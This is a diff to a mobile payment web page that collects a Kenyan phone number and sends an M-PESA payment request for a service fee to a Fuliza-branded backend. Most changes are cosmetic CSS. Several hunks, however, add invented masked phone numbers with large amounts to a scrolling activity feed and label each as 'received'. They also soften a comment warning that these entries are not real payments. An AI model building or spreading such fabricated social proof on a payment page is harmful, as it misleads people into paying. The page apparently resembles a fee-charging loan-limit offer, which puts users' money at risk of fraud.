@@ -30,7 +30,7 @@ body {
 
 header {
     background: #00A651;
-    color: white;
+    color: #fff;
     padding: 22px 0;
     text-align: center;
 }
@@ -41,7 +41,7 @@ header {
 }
 
 .card {
-    background: white;
+    background: #fff;
     margin-top: 24px;
     padding: 22px 18px 18px;
     border-radius: 14px;
@@ -50,21 +50,21 @@ header {
 }
 
 h1 {
-    color: white;
+    color: #fff;
     background: #00A651;
     padding: 12px 8px;
     border-radius: 10px;
     font-size: 22px;
+    font-weight: 700;
     text-align: center;
     margin-bottom: 16px;
 }
 
 .subtitle {
     background: #E8F7EF;
-    color: black;
+    color: #000;
     padding: 14px 12px;
     border-radius: 12px;
-    font-family: Arial, sans-serif;
     font-size: 14px;
     text-align: center;
     margin-bottom: 15px;
@@ -72,7 +72,7 @@ h1 {
 }
 
 .summary {
-    background: white;
+    background: #fff;
     border-radius: 13px;
     padding: 15px;
     margin-bottom: 15px;
@@ -91,7 +91,7 @@ h1 {
 }
 
 .label, .value {
-    color: black;
+    color: #000;
 }
 
 .value {
@@ -110,15 +110,15 @@ input {
     padding: 14px;
     border: 1px solid #B7E5CC;
     border-radius: 10px;
-    font-family: Arial, sans-serif;
+    font-family: 'Mali', cursive;
     font-size: 15px;
+    outline: none;
     margin-bottom: 17px;
-    background: white;
-    color: black;
+    background: #fff;
+    color: #000;
 }
 
 input:focus {
-    outline: none;
     border-color: #00A651;
 }
 
@@ -128,7 +128,7 @@ input:focus {
     border: 0;
     border-radius: 12px;
     background: #00A651;
-    color: white;
+    color: #fff;
     font-family: 'Mali', cursive;
     font-size: 20px;
     font-weight: 600;
@@ -144,7 +144,6 @@ input:focus {
     min-height: 22px;
     margin-top: 12px;
     color: #006B3F;
-    font-family: Arial, sans-serif;
     font-size: 13px;
     line-height: 1.5;
     text-align: center;
@@ -156,10 +155,10 @@ input:focus {
     margin-top: 22px;
     padding-top: 17px;
     border-top: 1px solid #B7E5CC;
+    font-family: 'Mali', cursive;
 }
 
 .activity-title {
-    font-family: Arial, sans-serif;
     font-size: 15px;
     font-weight: 700;
     color: #006B3F;
@@ -178,10 +177,6 @@ input:focus {
     animation: activityScroll 25s linear infinite;
 }
 
-.activity-window:hover .activity-list {
-    animation-play-state: paused;
-}
-
 .activity-item {
     min-height: 46px;
     padding: 12px 7px;
@@ -189,8 +184,8 @@ input:focus {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    gap: 6px;
-    font-family: Arial, sans-serif;
+    gap: 5px;
+    font-family: 'Mali', cursive;
     font-size: 12px;
 }
 
@@ -202,6 +197,7 @@ input:focus {
     color: #00A651;
     font-size: 13px;
     white-space: nowrap;
+    font-family: 'Mali', cursive;
 }
 
 @keyframes activityScroll {
@@ -213,14 +209,19 @@ input:focus {
     }
 }
 
+@media (prefers-reduced-motion: reduce) {
+    .activity-list {
+        animation: none;
+    }
+}
+
 .notice {
     margin-top: 15px;
     padding: 12px;
     background: #E8F7EF;
     border: 1px solid #B7E5CC;
     border-radius: 9px;
-    color: black;
-    font-family: Arial, sans-serif;
+    color: #000;
     font-size: 12px;
     line-height: 1.5;
 }
@@ -229,7 +230,6 @@ footer {
     text-align: center;
     padding: 15px 10px;
     color: #006B3F;
-    font-family: Arial, sans-serif;
     font-size: 12px;
     line-height: 1.7;
 }
@@ -251,11 +251,9 @@ footer a {
     .btn {
         font-size: 18px;
     }
-}
 
-@media(prefers-reduced-motion: reduce) {
-    .activity-list {
-        animation: none;
+    .activity-item {
+        font-size: 11px;
     }
 }
 </style>
@@ -323,7 +321,7 @@ Complete the payment using your M-PESA phone number.
     </div>
 
     <div class="message" id="activityNotice">
-        Illustrative activity display, not live payment records.
+        Illustrative activity preview, not verified payments.
     </div>
 
 </div>
@@ -345,9 +343,9 @@ Complete the payment using your M-PESA phone number.
 
 <script>
 
-// ====================================
+// =====================================
 // PAYMENT DETAILS
-// ====================================
+// =====================================
 
 const selectedServiceElement =
     document.getElementById("selectedService");
@@ -397,13 +395,13 @@ if (!selectedLimit || !serviceFee) {
 }
 
 
-// ====================================
+// =====================================
 // CURRENT ACTIVITY
-// ====================================
+// =====================================
 
-// Illustrative entries only.
-// Replace with verified backend records
-// before displaying them as actual payments.
+// Illustrative entries. Replace with
+// actual verified payment records for
+// a genuine live activity feed.
 
 const activityEntries = [
     ["0702***456", "8,000"],
@@ -417,7 +415,11 @@ const activityEntries = [
     ["0718***321", "8,000"],
     ["0706***432", "15,000"],
     ["0725***678", "25,000"],
-    ["0794***123", "35,000"]
+    ["0794***123", "35,000"],
+    ["0708***912", "55,000"],
+    ["0719***432", "65,000"],
+    ["0796***123", "75,000"],
+    ["0728***654", "85,000"]
 ];
 
 const activityList =
@@ -433,7 +435,7 @@ function renderActivity() {
     activityList.innerHTML =
         repeatedEntries.map(item => `
             <div class="activity-item">
-                <span>${item[0]}</span>
+                <span>${item[0]} received</span>
                 <strong>KSh ${item[1]}</strong>
             </div>
         `).join("");
@@ -442,9 +444,9 @@ function renderActivity() {
 renderActivity();
 
 
-// ====================================
+// =====================================
 // PHONE NORMALIZATION
-// ====================================
+// =====================================
 
 function normalizePhone(phone) {
 
@@ -462,9 +464,9 @@ function normalizePhone(phone) {
 }
 
 
-// ====================================
+// =====================================
 // SUBMIT PAYMENT
-// ====================================
+// =====================================
 
 paymentForm.addEventListener("submit", async function(event) {
 
@@ -477,7 +479,9 @@ paymentForm.addEventListener("submit", async function(event) {
     if (!phonePattern.test(enteredPhone)) {
 
         alert("Please enter a valid Kenyan phone number.");
+
         phoneInput.focus();
+
         return;
     }
 
@@ -497,9 +501,11 @@ paymentForm.addEventListener("submit", async function(event) {
             "https://fuliza-backend-1.onrender.com/stk-push",
             {
                 method: "POST",
+
                 headers: {
                     "Content-Type": "application/json"
                 },
+
                 body: JSON.stringify({
                     phone: phone,
                     amount: Number(serviceFee)
@@ -542,9 +548,9 @@ paymentForm.addEventListener("submit", async function(event) {
 });
 
 
-// ====================================
+// =====================================
 // CHECK PAYMENT STATUS
-// ====================================
+// =====================================
 
 async function checkPayment(transactionId) {
 
@@ -574,9 +580,11 @@ async function checkPayment(transactionId) {
                 "https://fuliza-backend-1.onrender.com/payment-status",
                 {
                     method: "POST",
+
                     headers: {
                         "Content-Type": "application/json"
                     },
+
                     body: JSON.stringify({
                         transactionId: transactionId
                     })
